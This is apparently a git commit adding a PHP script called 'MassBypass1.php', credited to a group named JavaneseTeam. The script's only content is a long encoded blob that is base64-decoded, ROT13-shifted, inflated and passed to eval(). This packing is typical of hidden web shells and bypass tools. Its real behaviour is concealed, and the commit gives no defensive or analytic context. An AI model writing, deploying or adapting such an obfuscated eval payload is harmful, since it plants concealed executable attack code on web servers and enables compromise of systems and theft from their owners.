44c13fb6460e5b138708e6b2bdfa8574b2420453
JavaneseTeam <64678913+simi6969@users.noreply.github.com>
2021-02-21 05:09:23 +0700

    Create MassBypass1.php

---
+++ MassBypass1.php
@@ -0,0 +1,10 @@
+<?php
+###############################################################################
+// Coded: Simsimi
+// http://javaneseteam.com (Coming Soon)
+// FB: Alexangentod
+###############################################################################
+
+$Kidsjamannow= "nUZ6eNswEP7cT/+DJgxkobXasDF1eY+0kMIoeFA/DDZTsIwlN8lxTI7V2l3+++5xdGhNBnABx/Ld6Wyee6vyUVjLEzK9973qxBP6+Pno0KvSMYlVxUaToJku6fHk6LBXZil8Z7pAsHnBuFC4nPveUy9YBDiwlWLFb5lMqYrG9A7n8e6nAO0tri50199UiXfV6McE7U8P7E90NpW9VIFQdZWUNvOpg+rk8MwoXfvgSoJrX8Y7cziSKCI0oOQX+fMRQ+ffmlOYQd4LHoMo6vSR7uda50A6Y6KQN0xa511BB1PXnNBDyGhw4oKX6+dP6adaxvOkPNW84dlS0YBysg1MFxRJPJHEuaKiyVoMYAx4M2c0toXI00Yyy5+EEeRdS3FkJ8XTFQiErtH+Ij0BuU+7yoD7FrzYEZAIBgKNwrxEeadoYTOSY1Y+UDIGs2SwW9fS7YF7/cOFLh5Y7vrmc+dh0FOosOuhatPLuVA1DtC7mbxyGYW1eZv46DCsjSrxLa2Ed31GT5C5qZQ2IetZ4HC7IKw4bKk4aa6WMhUXjD0Gkqfv4QksdOni/MPH8dmja0d0Tpp5KF7WJpEmZlyYSYw13nsGDaF40zR8VomwP1pRxzS+RbImRr7EyESwMRIGxj8OUyHDeA4VIHGJMExYTSN4XlM05U9FotzmUfRGaqAxJEriXza8dRPYO6IbqE5RUlaJXKdALs0KIGCB4AxopiSFCTM1YlcDT0zNW8NlbjKW5lJw9QIry20K8h8cuKqvVUlpcgPE/Rsslg8xFHnqED3jWDidn0SsK5zG5+l3x9Ot/iumG550cdZskKvH3C+YcBsw7yW1RG+XlciL1gLDg4LFi+is+9zHb9guauimb9TPLX09Essa9iG+46Upye2afEgPKjHCXBvVhgwFujkITD9zuDUw978B";
+eval(str_rot13(gzinflate(str_rot13(base64_decode(($Kidsjamannow)))))); 
+?>
